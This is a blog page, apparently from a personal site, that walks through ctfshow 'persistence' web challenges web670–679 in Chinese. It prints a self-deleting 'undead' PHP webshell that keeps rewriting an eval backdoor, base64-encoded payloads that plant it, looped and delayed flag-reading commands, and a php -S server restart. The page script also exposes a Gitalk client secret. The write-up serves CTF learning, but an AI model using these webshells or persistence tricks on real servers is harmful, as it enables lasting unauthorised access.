@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]权限维持 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1783248062137">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web670-web676
+源码
+&lt;?php
+
+// 题目说明：
+// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在
+
+error_reporting(0);
+highlight_f..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1783248062137" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]权限维持</h2>
+            <div class="post-date">2024-08-21</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowquan-xian-wei-chi.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web670-web676">web670-web676</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+// 题目说明：
+// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+$a=$_GET['action'];
+
+switch($a){
+    case 'cmd':
+        eval($_POST['cmd']);
+        break;
+    case 'check':
+        file_get_contents(&quot;http://checker/api/check&quot;);
+        break;
+    default:
+        die('params not validate');
+}
+
+</code></pre>
+<p>访问checker后具体执行操作没有代码🙃<br>
+根据其他人文章的猜测<br>
+服务器在监测到访问url后，就会写入flag，顺便删掉web目录所有文件。</p>
+<pre><code>echo 'flag{xxxx}' &gt; /flag_xx.txt
+rm -rf *
+</code></pre>
+<p>想办法维持住权限。<br>
+使用不死马，让服务器删不掉</p>
+<pre><code class="language-php">&lt;?php
+    ignore_user_abort(true);//设置客户端断开连接时是否中断脚本的执行
+    set_time_limit(0);//表示长时间链接运行，不限制运行时间
+    unlink(__FILE__);
+    $file = 'shell.php';
+    $code = '&lt;?php @eval($_POST[1]);?&gt;';
+    while (1) {
+        file_put_contents($file, $code);
+        usleep(5000);
+    }
+?&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>cmd=file_put_contents('dontdie.php',base64_decode(&quot;PD9waHANCiAgICBpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsNCiAgICBzZXRfdGltZV9saW1pdCgwKTsNCiAgICB1bmxpbmsoX19GSUxFX18pOw0KICAgICRmaWxlID0gJ3NoZWxsLnBocCc7DQogICAgJGNvZGUgPSAnPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs%2FPic7DQogICAgd2hpbGUgKDEpIHsNCiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb2RlKTsNCiAgICAgICAgdXNsZWVwKDUwMDApOw0KICAgIH0NCj8%2B&quot;));
+</code></pre>
+<p>上传之后第一次访问<code>dontdie.php</code>会一直转圈，再访问就会发现文件已经不在了。<br>
+连接shell.php</p>
+<p>访问<code>?action=check</code>后，会发现shell.php依然存在。</p>
+<h2 id="web677">web677</h2>
+<h2 id="web678">web678</h2>
+<p>web目录没有写权限，无法写入不死马<br>
+突然发现已经能执行php代码了，直击执行不死马不行吗😅<br>
+前面题目的payload可以换成（没试过，但应该可以）</p>
+<pre><code>cmd=eval(base64_decode('ICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOw0KICAgIHNldF90aW1lX2xpbWl0KDApOw0KICAgICRmaWxlID0gJ3NoZWxsLnBocCc7DQogICAgJGNvZGUgPSAnPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs%2FPic7DQogICAgd2hpbGUgKDEpIHsNCiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjb2RlKTsNCiAgICAgICAgdXNsZWVwKDUwMDApOw0KICAgIH0NCj8%2B'));
+</code></pre>
+<p>但因为不死马也是靠循环写文件实现的，所以这里还是不行。</p>
+<p>考虑使用循环命令执行或者延迟执行例如sleep，check只会删掉所有文件，而不会删掉进程</p>
+<pre><code>cmd=system('while true;do cat /f*;done');
+cmd=system('sleep 10;cat /f*');
+</code></pre>
+<p>大多数PHP环境的最大执行时间是30秒</p>
+<p>这里使用sleep方法</p>
+<p>##web679</p>
+<p>check后会关掉web服务</p>
+<p>使用<code>php -S</code>命令开启web服务</p>
+<pre><code>cmd=system('sleep 10;ls &gt; /dir;cd /;php -S 0.0.0.0:80');
+</code></pre>
+<p>把目录写入文件中，开启web服务后访问获取目录，再访问flag即可。</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/Jayjay___/article/details/132387118<br>
+https://blog.csdn.net/miuzzx/article/details/125521430</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowyii-zhuan-ti/">
+                  <h3 class="post-title">
+                    [ctfshow]Yii专题
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
